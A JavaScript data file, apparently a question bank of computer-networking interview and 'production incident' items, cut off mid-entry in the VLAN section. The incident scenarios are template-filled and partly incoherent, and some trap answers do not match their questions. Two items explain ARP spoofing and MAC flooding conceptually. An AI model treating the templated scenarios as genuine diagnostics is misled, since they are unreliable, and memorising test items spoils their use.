/**
 * MASTER COMPUTER NETWORKS (CN) PROBLEM SOLVING BENCHMARKS
 * Deeply authored scenario problems across all 48 canonical topics
 */

export const CN_PROBLEM_EXAMPLES = {
  "intro-to-networks": [
    {
      "id": "intro-to-networks-prob-1",
      "topicId": "intro-to-networks",
      "title": "Troubleshooting Introduction to Computer Networks: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Introduction to Computer Networks.",
      "symptom": "Packets must traverse 14,000 km of undersea optical fiber cables across 15 router hops within 200 milliseconds.",
      "coreConcept": "Network communication protocols standardize packetization, addressing, routing, and error checking across heterogenous hardware vendors.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Introduction to Computer Networks.",
        "2. Inspect the diagnostic logs: A branch office in Bangalore needs to access inventory records stored on a cloud database in Virginia, USA.",
        "3. Examine the failure mode: The Internet is owned and run by a single central governing computer.",
        "4. Apply root cause verification: The Internet is a decentralized network of networks operated by autonomous ISPs."
      ],
      "solution": "Correct operational implementation: The Internet relies on peer routing protocols without any central bottleneck or single owner.",
      "commonTrap": "The Internet is owned and run by a single central governing computer."
    },
    {
      "id": "intro-to-networks-prob-2",
      "topicId": "intro-to-networks",
      "title": "Interview Scenario: What is the difference between Circuit Switch...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between Circuit Switching and Packet Switching?",
      "symptom": "Candidate is asked to provide deep architectural justification for Introduction to Computer Networks.",
      "coreConcept": "A computer network is an interconnected collection of autonomous computing devices (hosts, switches, routers) that exchange data and share resources over communication links.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Circuit switching reserves a dedicated physical end-to-end communication channel for the entire session duration (e.g. t..."
      ],
      "solution": "Circuit switching reserves a dedicated physical end-to-end communication channel for the entire session duration (e.g. traditional landline telephone). Packet switching breaks data into discrete addressed packets that share communication links dynamically with other traffic (e.g. the Internet). Packet switching provides dramatically higher link utilization efficiency and resilience against link failures.",
      "commonTrap": "Bandwidth is the speed at which bits travel along a wire."
    }
  ],
  "network-types": [
    {
      "id": "network-types-prob-1",
      "topicId": "network-types",
      "title": "Troubleshooting Types of Networks: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Types of Networks.",
      "symptom": "Local branches need high-speed connectivity for staff PCs, but WAN links over public internet can suffer jitter and downtime.",
      "coreConcept": "Different physical layer standards (802.15 WPAN, 802.3 Ethernet, 802.11 Wi-Fi, MPLS/SD-WAN) optimize bandwidth, power consumption, and distance.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Types of Networks.",
        "2. Inspect the diagnostic logs: A national retail bank connects 5,000 local branches across India to a central core banking database in Mumbai.",
        "3. Examine the failure mode: WLAN is a separate higher-tier network type than LAN.",
        "4. Apply root cause verification: WLAN is simply the wireless transmission variant of a LAN (IEEE 802.11)."
      ],
      "solution": "Correct operational implementation: WLAN operates within LAN geographical scale but uses radio frequency instead of copper cables.",
      "commonTrap": "WLAN is a separate higher-tier network type than LAN."
    },
    {
      "id": "network-types-prob-2",
      "topicId": "network-types",
      "title": "Interview Scenario: Why is latency significantly lower on a LAN t...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why is latency significantly lower on a LAN than on a WAN?",
      "symptom": "Candidate is asked to provide deep architectural justification for Types of Networks.",
      "coreConcept": "Networks are classified by their geographical span, administrative control, data transmission rates, and physical media into PAN, LAN, WLAN, MAN, and WAN.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: LAN latency is typically under 1 millisecond because physical cable runs are short (<100m for Cat6), media is dedicated ..."
      ],
      "solution": "LAN latency is typically under 1 millisecond because physical cable runs are short (<100m for Cat6), media is dedicated with minimal queuing delay, and switching occurs at Layer 2 without routing table lookup overhead. WAN latency (40-200ms) is constrained by the speed of light over thousands of kilometers of fiber, serialization delays across lower-bandwidth pipes, and queuing delays through multiple transit routers.",
      "commonTrap": "WANs always provide faster throughput than LANs because they are bigger."
    }
  ],
  "network-topologies": [
    {
      "id": "network-topologies-prob-1",
      "topicId": "network-topologies",
      "title": "Troubleshooting Network Topologies: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Network Topologies.",
      "symptom": "A Star topology would fail completely if the central core switch suffered power failure or backplane lockup.",
      "coreConcept": "Standardized topologies balance cost vs redundancy: Star for enterprise LANs, Full Mesh for ISP backbones, Hybrid for campus infrastructures.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Network Topologies.",
        "2. Inspect the diagnostic logs: A nuclear power plant control system requires zero packet loss even if two fiber lines are accidentally severed by construction equipment.",
        "3. Examine the failure mode: A Full Mesh topology is always the best choice for an office network.",
        "4. Apply root cause verification: Full Mesh for 500 computers would require 124,750 cable runs and 499 NIC ports per PC."
      ],
      "solution": "Correct operational implementation: Full Mesh is cost-prohibitive for end hosts; it is reserved for core ISP routers and mission-critical clusters.",
      "commonTrap": "A Full Mesh topology is always the best choice for an office network."
    },
    {
      "id": "network-topologies-prob-2",
      "topicId": "network-topologies",
      "title": "Interview Scenario: How many physical links are needed for a Full...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "How many physical links are needed for a Full Mesh network with 10 nodes?",
      "symptom": "Candidate is asked to provide deep architectural justification for Network Topologies.",
      "coreConcept": "A network topology defines how devices (nodes) and communication pathways (links) are physically wired and logically configured to route traffic.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: The formula for a Full Mesh network is n*(n - 1) / 2. For 10 nodes: 10 * (10 - 1) / 2 = 10 * 9 / 2 = 45 physical duplex ..."
      ],
      "solution": "The formula for a Full Mesh network is n*(n - 1) / 2. For 10 nodes: 10 * (10 - 1) / 2 = 10 * 9 / 2 = 45 physical duplex links. Each node must have (n - 1) = 9 dedicated network interfaces.",
      "commonTrap": "In a Star topology, if one host cable breaks, the whole network stops."
    }
  ],
  "network-devices": [
    {
      "id": "network-devices-prob-1",
      "topicId": "network-devices",
      "title": "Troubleshooting Network Devices: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Network Devices.",
      "symptom": "If connected via a Hub, the attacker's NIC hears all electrical signals and reads all packets in cleartext.",
      "coreConcept": "Layer 2 Switches maintain MAC address tables for dedicated micro-segmentation; Layer 3 Routers use IP routing tables to segment broadcast domains.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Network Devices.",
        "2. Inspect the diagnostic logs: An attacker plugs a Wireshark laptop into a wall port and attempts to capture coworker passwords transmitted across the floor.",
        "3. Examine the failure mode: A switch breaks up broadcast domains.",
        "4. Apply root cause verification: Switches forward all broadcast frames (FF:FF:FF:FF:FF:FF) out of all active ports."
      ],
      "solution": "Correct operational implementation: A switch breaks collision domains; a ROUTER breaks broadcast domains.",
      "commonTrap": "A switch breaks up broadcast domains."
    },
    {
      "id": "network-devices-prob-2",
      "topicId": "network-devices",
      "title": "Interview Scenario: What is the difference between a Hub, a Switc...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between a Hub, a Switch, and a Router in terms of collision and broadcast domains?",
      "symptom": "Candidate is asked to provide deep architectural justification for Network Devices.",
      "coreConcept": "Network hardware devices operate at distinct layers of the OSI reference model to regenerate signals, direct local frames, route internet packets, or translate protocol suites.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: A Hub has 1 single collision domain and 1 broadcast domain across all ports. A Switch provides a dedicated collision dom..."
      ],
      "solution": "A Hub has 1 single collision domain and 1 broadcast domain across all ports. A Switch provides a dedicated collision domain for each individual port, but shares 1 single broadcast domain across all ports (unless partitioned by VLANs). A Router provides both separate collision domains per interface AND breaks broadcast domains, meaning broadcasts are not forwarded across router interfaces.",
      "commonTrap": "A router forwards traffic based on MAC address."
    }
  ],
  "osi-model": [
    {
      "id": "osi-model-prob-1",
      "topicId": "osi-model",
      "title": "Troubleshooting OSI 7-Layer Reference Model: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over OSI 7-Layer Reference Model.",
      "symptom": "How do abstract application concepts (URL string) convert into microscopic optical pulses in undersea glass cables?",
      "coreConcept": "Each layer provides a specific service to the layer above it, abstracting the complexities of the underlying layers through standardized Protocol Data Units (PDUs).",
      "analysis": [
        "1. Isolate the affected OSI layer associated with OSI 7-Layer Reference Model.",
        "2. Inspect the diagnostic logs: A student types https://google.com into their laptop and hits Enter.",
        "3. Examine the failure mode: The OSI model is the physical protocol stack currently running the Internet.",
        "4. Apply root cause verification: The modern Internet runs on the 4-layer TCP/IP protocol suite, not the 7-layer OSI model."
      ],
      "solution": "Correct operational implementation: OSI is a conceptual reference model; TCP/IP is the practical implementation.",
      "commonTrap": "The OSI model is the physical protocol stack currently running the Internet."
    },
    {
      "id": "osi-model-prob-2",
      "topicId": "osi-model",
      "title": "Interview Scenario: Name the 7 layers of the OSI model from botto...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Name the 7 layers of the OSI model from bottom to top, their corresponding Protocol Data Units (PDUs), and one protocol for each.",
      "symptom": "Candidate is asked to provide deep architectural justification for OSI 7-Layer Reference Model.",
      "coreConcept": "The Open Systems Interconnection (OSI) reference model is an ISO conceptual framework dividing computer network communication into 7 distinct abstraction layers.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. Physical (Bits, 802.3u); 2. Data Link (Frames, Ethernet/ARP); 3. Network (Packets, IPv4/ICMP); 4. Transport (Segments..."
      ],
      "solution": "1. Physical (Bits, 802.3u); 2. Data Link (Frames, Ethernet/ARP); 3. Network (Packets, IPv4/ICMP); 4. Transport (Segments, TCP/UDP); 5. Session (Data, RPC/NetBIOS); 6. Presentation (Data, TLS/ASCII); 7. Application (Data, HTTP/DNS).",
      "commonTrap": "Routers operate at all 7 layers of the OSI model."
    }
  ],
  "tcp-ip-model": [
    {
      "id": "tcp-ip-model-prob-1",
      "topicId": "tcp-ip-model",
      "title": "Troubleshooting TCP/IP 4-Layer Architecture: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over TCP/IP 4-Layer Architecture.",
      "symptom": "The developer only wants to write application business logic without managing packet loss, bit flips, or optical transceivers.",
      "coreConcept": "Combines application, presentation, and session into one Application layer; retains pure Network Interface, Internet, and Transport layers.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with TCP/IP 4-Layer Architecture.",
        "2. Inspect the diagnostic logs: A Linux developer builds a Node.js microservice communicating with Redis and PostgreSQL.",
        "3. Examine the failure mode: TCP/IP has 5 layers officially.",
        "4. Apply root cause verification: The original RFC 1122 specification defines exactly 4 layers (Network Interface, Internet, Transport, Application)."
      ],
      "solution": "Correct operational implementation: Some textbooks split the bottom layer into Physical + Data Link (5-layer pedagogical model), but standard TCP/IP is 4 layers.",
      "commonTrap": "TCP/IP has 5 layers officially."
    },
    {
      "id": "tcp-ip-model-prob-2",
      "topicId": "tcp-ip-model",
      "title": "Interview Scenario: Why did the TCP/IP model succeed in the marke...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why did the TCP/IP model succeed in the marketplace while the OSI model remained largely academic?",
      "symptom": "Candidate is asked to provide deep architectural justification for TCP/IP 4-Layer Architecture.",
      "coreConcept": "The TCP/IP model (Department of Defense DoD model) is the practical 4-layer protocol stack that actually implements and powers the global Internet.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: TCP/IP was developed with an 'implementation-first' pragmatic philosophy (running code and rough consensus through IETF ..."
      ],
      "solution": "TCP/IP was developed with an 'implementation-first' pragmatic philosophy (running code and rough consensus through IETF RFCs). It was integrated for free into BSD Unix in 1983, allowing university and military researchers to immediately interconnect machines. In contrast, the OSI standards were committee-driven, overly complex (Session and Presentation layers had weak justification), and too slow to market.",
      "commonTrap": "TCP/IP requires TCP for every single connection."
    }
  ],
  "osi-vs-tcp-ip": [
    {
      "id": "osi-vs-tcp-ip-prob-1",
      "topicId": "osi-vs-tcp-ip",
      "title": "Troubleshooting OSI vs TCP/IP Model Comparison: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over OSI vs TCP/IP Model Comparison.",
      "symptom": "What does AWS mean by calling ALB a 'Layer 7' device and NLB a 'Layer 4' device?",
      "coreConcept": "Mapping OSI Layers 5, 6, and 7 to TCP/IP Application layer clarifies where functionality belongs in software vs the kernel.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with OSI vs TCP/IP Model Comparison.",
        "2. Inspect the diagnostic logs: A cloud engineer configures an AWS Application Load Balancer (ALB) and a Network Load Balancer (NLB).",
        "3. Examine the failure mode: Presentation and Session layers do not exist in TCP/IP applications.",
        "4. Apply root cause verification: The functionality still exists; it is just handled by user libraries rather than separate kernel layers."
      ],
      "solution": "Correct operational implementation: In TCP/IP, presentation (TLS encryption, JSON serialization) is implemented directly inside the application layer.",
      "commonTrap": "Presentation and Session layers do not exist in TCP/IP applications."
    },
    {
      "id": "osi-vs-tcp-ip-prob-2",
      "topicId": "osi-vs-tcp-ip",
      "title": "Interview Scenario: What is the difference between an OSI Layer 4...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between an OSI Layer 4 Load Balancer and a Layer 7 Load Balancer?",
      "symptom": "Candidate is asked to provide deep architectural justification for OSI vs TCP/IP Model Comparison.",
      "coreConcept": "A direct architectural comparison between the 7-layer theoretical OSI reference model and the 4-layer practical TCP/IP protocol suite.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: A Layer 4 Load Balancer routes traffic based on network and transport layer headers (Source IP, Destination IP, Port) wi..."
      ],
      "solution": "A Layer 4 Load Balancer routes traffic based on network and transport layer headers (Source IP, Destination IP, Port) without inspecting the application payload. It makes routing decisions on the initial TCP SYN packet, providing extremely high throughput and low CPU overhead. A Layer 7 Load Balancer terminates the TCP connection, decrypts SSL/TLS, and parses application data (HTTP headers, URL paths, cookies). It enables intelligent content routing (e.g. /api -> backend microservice, /static -> CDN), but incurs higher CPU and memory overhead.",
      "commonTrap": "OSI came first, and then TCP/IP was invented to replace it."
    }
  ],
  "encapsulation-decapsulation": [
    {
      "id": "encapsulation-decapsulation-prob-1",
      "topicId": "encapsulation-decapsulation",
      "title": "Troubleshooting Encapsulation & Decapsulation: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Encapsulation & Decapsulation.",
      "symptom": "The packet must navigate 12 intermediate ISP routers that speak different link-layer technologies (Ethernet, MPLS, Wi-Fi).",
      "coreConcept": "Headers act as layer-specific contracts. Each layer processes its own header and discards it before passing payload up to the next layer.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Encapsulation & Decapsulation.",
        "2. Inspect the diagnostic logs: A user clicks 'Checkout' on an e-commerce website, sending an encrypted credit card token.",
        "3. Examine the failure mode: The IP header changes at every router hop.",
        "4. Apply root cause verification: Source IP and Destination IP remain unchanged end-to-end across the Internet (unless traversing a NAT gateway)."
      ],
      "solution": "Correct operational implementation: The L2 MAC header changes at EVERY router hop; the L3 IP header remains constant end-to-end (except TTL decrement).",
      "commonTrap": "The IP header changes at every router hop."
    },
    {
      "id": "encapsulation-decapsulation-prob-2",
      "topicId": "encapsulation-decapsulation",
      "title": "Interview Scenario: As an IP packet travels across three routers ...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "As an IP packet travels across three routers from Host A to Host B, which headers change at each hop and which stay the same?",
      "symptom": "Candidate is asked to provide deep architectural justification for Encapsulation & Decapsulation.",
      "coreConcept": "Encapsulation is the process where each layer on the sender wraps payload data from the layer above with its own protocol control header. Decapsulation is the reverse unpacking process on the receiver.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: At each router hop: 1. The Layer 2 Data Link (Ethernet) Frame header is completely stripped and replaced with a new Sour..."
      ],
      "solution": "At each router hop: 1. The Layer 2 Data Link (Ethernet) Frame header is completely stripped and replaced with a new Source MAC (the router's egress interface) and Destination MAC (the next hop router or host). 2. The Layer 3 IP header remains constant end-to-end (Source IP and Destination IP do NOT change, assuming no NAT), with the exception of the TTL field (decremented by 1) and the IP Header Checksum (recalculated). 3. The Layer 4 Transport header and Layer 7 Application payload are never touched by intermediate routers.",
      "commonTrap": "Encapsulation only adds headers at the beginning of data."
    }
  ],
  "mac-address": [
    {
      "id": "mac-address-prob-1",
      "topicId": "mac-address",
      "title": "Troubleshooting MAC Addressing: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over MAC Addressing.",
      "symptom": "Its IP address changes from 10.0.1.45 (office) to 192.168.1.80 (coffee shop). How does the local network recognize its network card?",
      "coreConcept": "Every NIC manufacturer is assigned an IEEE Organizationally Unique Identifier (OUI), guaranteeing global physical uniqueness for every manufactured network chip.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with MAC Addressing.",
        "2. Inspect the diagnostic logs: A laptop connects to office Wi-Fi, then drives to a coffee shop and connects to public Wi-Fi.",
        "3. Examine the failure mode: A MAC address is routable across the public Internet.",
        "4. Apply root cause verification: MAC addresses are link-local only. Routers discard the incoming L2 MAC header when forwarding to the next hop."
      ],
      "solution": "Correct operational implementation: MAC addresses only have significance within a single local Layer 2 broadcast domain.",
      "commonTrap": "A MAC address is routable across the public Internet."
    },
    {
      "id": "mac-address-prob-2",
      "topicId": "mac-address",
      "title": "Interview Scenario: Why do we need both MAC addresses and IP addr...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why do we need both MAC addresses and IP addresses? Why can't we use just one?",
      "symptom": "Candidate is asked to provide deep architectural justification for MAC Addressing.",
      "coreConcept": "A Media Access Control (MAC) address is a unique, 48-bit (6-byte) physical identifier permanently burned into the Read-Only Memory of a Network Interface Card (NIC).",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: MAC addresses and IP addresses serve fundamentally different architectural purposes. A MAC address is a flat, non-hierar..."
      ],
      "solution": "MAC addresses and IP addresses serve fundamentally different architectural purposes. A MAC address is a flat, non-hierarchical 48-bit identifier identifying a physical hardware interface on a local link. If the global Internet ran on MAC addresses, core internet routers would need routing tables with billions of individual entries (one for every device on Earth), causing immediate memory exhaustion and routing collapse. In contrast, IP addresses are hierarchical (Network ID + Host ID), allowing routers to aggregate millions of hosts into a single route prefix (e.g. /16 or /24). Conversely, we cannot use only IP addresses because hosts frequently join networks without an IP (DHCP requires MAC to assign an IP), and IP addresses change whenever a host moves networks.",
      "commonTrap": "MAC addresses can never be changed under any circumstances."
    }
  ],
  "ethernet-frames": [
    {
      "id": "ethernet-frames-prob-1",
      "topicId": "ethernet-frames",
      "title": "Troubleshooting Ethernet & Frame Structure: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Ethernet & Frame Structure.",
      "symptom": "Ethernet requires a minimum frame size of 64 bytes for collision detection (CSMA/CD on half-duplex links).",
      "coreConcept": "Ethernet defines preambles for clock synchronization, address fields for switching, an EtherType field for protocol demultiplexing, and a 32-bit CRC checksum for error detection.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Ethernet & Frame Structure.",
        "2. Inspect the diagnostic logs: A 10-byte ICMP Echo Request needs to be transmitted over an Ethernet link.",
        "3. Examine the failure mode: Ethernet retransmits frames automatically when the CRC checksum fails.",
        "4. Apply root cause verification: Ethernet detects errors; it does NOT correct or retransmit them."
      ],
      "solution": "Correct operational implementation: Ethernet silently drops corrupted frames. Retransmission is left to upper layers like TCP.",
      "commonTrap": "Ethernet retransmits frames automatically when the CRC checksum fails."
    },
    {
      "id": "ethernet-frames-prob-2",
      "topicId": "ethernet-frames",
      "title": "Interview Scenario: Why does Ethernet enforce a minimum frame siz...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why does Ethernet enforce a minimum frame size of 64 bytes?",
      "symptom": "Candidate is asked to provide deep architectural justification for Ethernet & Frame Structure.",
      "coreConcept": "An Ethernet frame is the standardized Layer 2 Protocol Data Unit (IEEE 802.3) used to transmit data across wired local area networks.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: The minimum frame size of 64 bytes was mandated by Ethernet's CSMA/CD (Carrier Sense Multiple Access with Collision Dete..."
      ],
      "solution": "The minimum frame size of 64 bytes was mandated by Ethernet's CSMA/CD (Carrier Sense Multiple Access with Collision Detection) protocol. In a shared half-duplex coaxial collision domain (up to 2.5 km with repeaters), a sender must transmit for at least the round-trip propagation time (slot time = 51.2 microseconds at 10 Mbps) to ensure that if a collision occurs at the furthest end of the cable, the collision signal travels back before the sender finishes transmitting. At 10 Mbps, 51.2 microseconds equals exactly 512 bits = 64 bytes. If a frame were smaller (a 'runt'), the sender might finish transmitting and assume success before the collision fragment returned.",
      "commonTrap": "Maximum Transmission Unit (MTU) includes the Ethernet header."
    }
  ],
  "arp-protocol": [
    {
      "id": "arp-protocol-prob-1",
      "topicId": "arp-protocol",
      "title": "Troubleshooting ARP: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over ARP.",
      "symptom": "PC A has no entry for 192.168.1.20 in its ARP cache. The ICMP Echo Request is held in memory buffer.",
      "coreConcept": "Host A broadcasts an ARP Request (Who has 192.168.1.50? Tell 192.168.1.10). Host B hears the broadcast and unicasts back an ARP Reply containing its MAC address.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with ARP.",
        "2. Inspect the diagnostic logs: PC A (192.168.1.10) wants to ping PC B (192.168.1.20) for the very first time after booting.",
        "3. Examine the failure mode: ARP is used to resolve remote Internet websites like google.com to a MAC address.",
        "4. Apply root cause verification: ARP is strictly link-local. You cannot ARP a remote public IP."
      ],
      "solution": "Correct operational implementation: To reach google.com, the host uses ARP to find the MAC address of its DEFAULT GATEWAY router, not Google's server.",
      "commonTrap": "ARP is used to resolve remote Internet websites like google.com to a MAC address."
    },
    {
      "id": "arp-protocol-prob-2",
      "topicId": "arp-protocol",
      "title": "Interview Scenario: What is ARP Spoofing (ARP Poisoning) and how ...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is ARP Spoofing (ARP Poisoning) and how does an attacker execute a Man-in-the-Middle (MITM) attack with it?",
      "symptom": "Candidate is asked to provide deep architectural justification for ARP.",
      "coreConcept": "Address Resolution Protocol (ARP, RFC 826) dynamically resolves a known Layer 3 logical IP address to an unknown Layer 2 physical MAC address on a local network segment.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: ARP is stateless and does not authenticate replies; hosts will blindly update their ARP cache whenever they receive an A..."
      ],
      "solution": "ARP is stateless and does not authenticate replies; hosts will blindly update their ARP cache whenever they receive an ARP Reply, even if they never sent a request. In an ARP Spoofing attack, an attacker on the same LAN sends unsolicited (gratuitous) fake ARP replies to the Victim host claiming: 'I have the Default Gateway IP' (binding Gateway IP to Attacker MAC), and sends fake replies to the Router claiming: 'I have the Victim IP' (binding Victim IP to Attacker MAC). All bidirectional internet traffic between the victim and gateway now routes through the attacker's machine, allowing packet sniffing and session hijacking.",
      "commonTrap": "ARP runs over UDP or TCP."
    }
  ],
  "switching-mac-table": [
    {
      "id": "switching-mac-table-prob-1",
      "topicId": "switching-mac-table",
      "title": "Troubleshooting Switching Mechanics & CAM/MAC Address Table: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Switching Mechanics & CAM/MAC Address Table.",
      "symptom": "If the switch flooded the 50 GB backup to all 48 ports, all other 46 employees would experience severe network lag.",
      "coreConcept": "Switches dynamically learn the Source MAC address of every incoming frame and record it against the receiving physical port in their CAM table.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Switching Mechanics & CAM/MAC Address Table.",
        "2. Inspect the diagnostic logs: An enterprise switch connects 48 workstations. Host 1 sends a heavy 50 GB database backup to Host 2.",
        "3. Examine the failure mode: A switch learns MAC addresses from the Destination MAC field of the frame.",
        "4. Apply root cause verification: The switch has no idea where the destination device is until that device sends traffic."
      ],
      "solution": "Correct operational implementation: A switch learns MAC addresses strictly from the SOURCE MAC address of incoming frames.",
      "commonTrap": "A switch learns MAC addresses from the Destination MAC field of the frame."
    },
    {
      "id": "switching-mac-table-prob-2",
      "topicId": "switching-mac-table",
      "title": "Interview Scenario: What is a MAC Flooding Attack (CAM Table Over...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is a MAC Flooding Attack (CAM Table Overflow) and how does it compromise switch security?",
      "symptom": "Candidate is asked to provide deep architectural justification for Switching Mechanics & CAM/MAC Address Table.",
      "coreConcept": "A Layer 2 Switch is an intelligent multiport network bridge that uses a Content Addressable Memory (CAM) table to forward frames directly to target recipient ports without flooding.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: A switch CAM table has finite hardware memory (e.g., 8,000 to 128,000 MAC entries). In a MAC Flooding attack, an attacke..."
      ],
      "solution": "A switch CAM table has finite hardware memory (e.g., 8,000 to 128,000 MAC entries). In a MAC Flooding attack, an attacker uses tools like macof to generate hundreds of thousands of bogus Ethernet frames with randomized fake source MAC addresses every second. The switch CAM table fills to capacity, evicting legitimate entries. When the CAM table overflows, the switch can no longer store new MACs and enters 'Fail-Open' mode: it treats all incoming frames as Unknown Unicasts and floods them out of EVERY physical port. The switch effectively degrades into a dumb Hub, allowing the attacker on any port to sniff all confidential network traffic with Wireshark. Defense: Port Security (limiting MAC count per port).",
      "commonTrap": "Switches never flood traffic under normal operation."
    }
  ],
  "vlan": [
    {
      "id": "vlan-prob-1",
      "topicId": "vlan",
      "title": "Troubleshooting VLAN: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over VLAN.",
      "symptom": "Patient cardiac telemetry devices must never be accessible from the public guest Wi-Fi network.",
      "coreConcept": "Switches tag Ethernet frames with a 4-byte 802.1Q header containing a 12-bit VLAN ID (1 to 4094). Frames never cross between VLANs unless routed by a Layer 3 router.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with VLAN.",
        "2. Inspect the diagnostic logs: A hospital switch connects receptionist terminals, patient monitoring devices, and guest public Wi-Fi on the same 48-port switch.",
        "3. Examine the failure mode: Two computers on different VLANs on the same switch can communicate directly at Layer 2.",
        "4. Apply root cause verification: VLANs create completely isolated broadcast domains."
      ],
      "solution": "Correct operational implementation: Communication between different VLANs ALWAYS requires a Layer 3 routing device (Router-on-a-Stick or Layer 3 Switch).",
      "commonTrap": "Two computers on different VLANs on the same switch can communicate directly at Layer 2."
    },
    {
      "id": "vlan-prob-2",
      "topicId": "vlan",
      "title": "Interview Scenario: What is 'Router-on-a-Stick' and how does it e...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is 'Router-on-a-Stick' and how does it enable Inter-VLAN routing?",
      "symptom": "Candidate is asked to provide deep architectural justification for VLAN.",
      "coreConcept": "A Virtual LAN (VLAN, IEEE 802.1Q) logically partitions a single physical Layer 2 switch infrastructure into multiple isolated broadcast domains.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Because switches cannot route traffic between different VLANs at Layer 2, Inter-VLAN routing is required. In a 'Router-o..."
      ],
